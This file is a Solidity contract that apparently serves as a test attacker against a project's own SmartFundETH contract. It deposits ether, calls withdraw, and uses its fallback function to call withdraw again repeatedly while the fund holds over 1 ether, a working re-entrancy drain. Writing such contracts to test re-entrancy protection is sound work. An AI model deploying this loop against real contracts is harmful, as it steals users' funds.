pragma solidity ^0.6.12;

import "../../contracts/core/full_funds/SmartFundETH.sol";
import "../../contracts/zeppelin-solidity/contracts/token/ERC20/IERC20.sol";


contract ReEntrancyFundAtack {
    SmartFundETH public fund;
    address public fundAddress;

    constructor(address payable _fund)public{
        fund = SmartFundETH(_fund);
        fundAddress = _fund;
    }

    // pay to contract
    function pay() public payable{}

    // deposit to fund from contract
    function deposit(uint256 _amount)public{
        fund.deposit.value(_amount)();
    }

    function updateFundValueFromAtacker(address _oracleTokenAddress, uint256 _oracleFee) public {
        IERC20(_oracleTokenAddress).transferFrom(msg.sender, address(this),_oracleFee);
        IERC20(_oracleTokenAddress).approve(fundAddress, _oracleFee);
        fund.updateFundValueFromOracle(_oracleTokenAddress, _oracleFee);
    }


    function startAtack()public{
        fund.withdraw(0);
    }

    // loop
    fallback() external payable {
        if(fundAddress.balance > 1 ether){
            fund.withdraw(0);
        }
    }
}
